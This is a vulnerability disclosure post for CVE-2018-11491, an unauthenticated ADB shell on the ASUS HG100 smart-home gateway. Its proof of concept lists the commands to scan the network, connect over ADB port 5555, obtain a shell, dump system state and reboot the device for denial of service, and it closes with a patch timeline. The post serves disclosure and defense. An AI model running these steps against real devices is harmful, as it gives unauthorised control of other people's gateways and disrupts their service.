---
layout: post
title:  "CVE-2018-11491"
subtitle: "ASUS HG100 exists unauthenticated access vulnerability"
author: Mars Cheng
tags: 
- CVE
- ASUS
- NCCST
---

>Description: ASUS HG100 devices with firmware before 1.05.12 allow unauthenticated access, leading to remote command execution.

>This vulnerability was discovered by Mars Cheng at **National Center for Cyber Security Technology (NCCST)**

<div style="text-align: center">
<img src="https://i.imgur.com/S5EAPKv.png"/>
</div>
<br>

---

## Introduction ASUS HG100 SmartHome GateWay
<div style="text-align: center">
<img src="https://i.imgur.com/xkfNTTu.png"/>
</div>



| Length x width x height | Weight | Wireless connection |
| -------- | -------- | -------- |
| 152 x 67 x 167 mm     | 256g     | WiFi 802.11b/g/n ; ZigBee PRO ; BlueTooth 4.0   |

---

## Proof of Concept



### 1.Confirm IP

```
nmap --scanflags SYN 192.168.0.0/24
```
* Port 5555 open
<div style="text-align: center">
<img src="https://i.imgur.com/c4c7kwM.png"/>
</div>

### 2.Connect port 5555 with ADB
```
adb connect 192.168.0.100
```

<div style="text-align: center">
<img src="https://i.imgur.com/JM7pymJ.png"/>
</div>


```
adb shell
```

<div style="text-align: center">
<img src="https://i.imgur.com/8ur8l5p.png"/>
</div>


```
id
```

<div style="text-align: center">
<img src="https://i.imgur.com/RoryPJv.png"/>
</div>

```
dumpstate
```

* Show system process detail

<div style="text-align: center">
<img src="https://i.imgur.com/8QscCma.png"/>
</div>

### 3.Reboot device and Denial of Service 

```
reboot
```

<div style="text-align: center">
<img src="https://i.imgur.com/qnuaiFg.png"/>
</div>

* Check device status

<div style="text-align: center">
<img src="https://i.imgur.com/za4z9be.png"/>
</div>

### Timeline
*  February 6, 2018 Reported to ASUS Security
*  July 3, 2018 Patch released 


### Reference
[1] <https://www.asus.com/tw/News/qnEosWKPVDpmOeqL> <br>
[2] <https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11491>
